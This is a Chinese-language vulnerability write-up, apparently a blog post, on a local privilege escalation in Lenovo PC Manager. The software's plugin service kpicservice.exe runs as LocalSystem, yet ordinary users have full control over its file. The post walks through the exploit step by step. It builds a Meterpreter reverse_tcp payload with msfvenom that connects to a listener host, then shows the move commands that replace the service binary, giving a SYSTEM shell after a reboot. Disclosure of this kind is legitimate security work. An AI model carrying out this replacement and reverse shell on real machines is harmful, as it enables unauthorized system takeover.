学习本地权限提升的过程中无意中发现的。

在联想电脑管家的任意版本中，联想电脑管家的工具都存在权限缺陷，只要是下载的工具，普通用户拥有 F 权限（完全权限）

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749113267870-6d93022b-0230-4b36-809e-c0e6a8c8004f.png)

由于所有版本的工具都存在权限问题，普通用户可以进如 admin 权限，这边使用 ai 看图插件演示，因为其有 system 权限服务，可以提升至 system，在 5.1.100.1102 之前，联想电脑管家存在插件 AI 看图

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749129976066-e2419c85-0126-437c-9252-5de07ed3ebba.png)

在安装 AI 看图插件后，其存在一个可持续服务

```plain
C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe
```

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749113318875-528fb332-1648-4d10-bceb-bfbf7908fe7d.png)

使用 icacls 查看其文件权限

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749113352091-c2cb863e-8134-44be-b7ea-97cf326195a2.png)

发现普通 Users 权限为 I F，完全权限，创建一个普通用户

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749113751934-11d5b11b-61c3-4f2a-8a1a-5ea5b25163dd.png)



切入攻击视角，在 Administors 用户组未登入的情况下，需要注销所有用户，我们再进入 user1 用户，使用 sc 查看服务，其用户为 LocalSystem

```plain
sc qc KPICService_Lenovo
```

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749114713044-1c54a835-1468-4338-9906-3f49c01e8bcd.png)

其中 C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe 就是普通用户拥有完全控制的文件

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749115192782-64aec286-a522-4ce0-9bb7-816b72477da3.png)

但是因为限制，该服务会一直占用，普通用户需要 admin 才能进行关闭

尝试更换思路：因为普通用户有完全控制权限，普通用户将文件进行移动，重启时，服务读取配置路径，还是会以 LocalSystem 运行 kpicservice.exe



现在开始实践，先生成一个 kpicservice.exe

```plain
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=4444 -f exe -o kpicservice.exe
```

同时将原文件路径进行移动 ，并将 shell 替换原文件的 kpicservice.exe

```plain
move C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe kpicservice.exe
move Desktop\kpicservice.exe C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe
```

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749135025757-80e763a1-1066-4365-a5f5-dd3b05c53613.png)

此时再重启设备，服务会启动路径中即被替换的 kpicservice ，获得 system 权限

![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1749135262841-f8e59ef4-de58-408b-81ea-f7caedb7f6c1.png)

